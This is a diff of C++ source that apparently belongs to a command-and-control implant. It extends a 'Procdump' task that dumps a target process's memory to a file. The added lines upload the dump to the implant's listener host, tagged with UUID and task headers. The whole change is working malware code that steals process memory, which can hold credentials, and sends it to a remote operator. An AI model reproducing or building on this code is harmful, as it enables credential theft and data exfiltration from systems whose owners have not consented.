@@ -2,7 +2,7 @@
 
 namespace Task
 {
-    std::wstring Procdump(const std::wstring& wPid)
+    std::wstring Procdump(State::PSTATE pState, const std::wstring& wPid)
     {
          DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
         // std::wstring wDumpFilePath = L"tmp.dmp";
@@ -45,6 +45,26 @@ namespace Task
 
         CloseHandle(hFile);
         CloseHandle(hProcess);
+
+        // Upload a dumped file.
+        std::wstring wHeaders = L"";
+        wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
+        wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
+        wHeaders += L"X-FILE: procdump\r\n";
+
+        BOOL bResult = System::Http::UploadFile(
+            pState->pProcs,
+            pState->hConnect,
+            pState->lpListenerHost,
+            pState->nListenerPort,
+            pState->lpReqPathUpload,
+            wHeaders.c_str(),
+            wDumpFilePath
+        );
+        if (!bResult)
+        {
+            return L"Error: Could not upload the dump file.";
+        }
 
         return wDumpFilePath.c_str();
     }
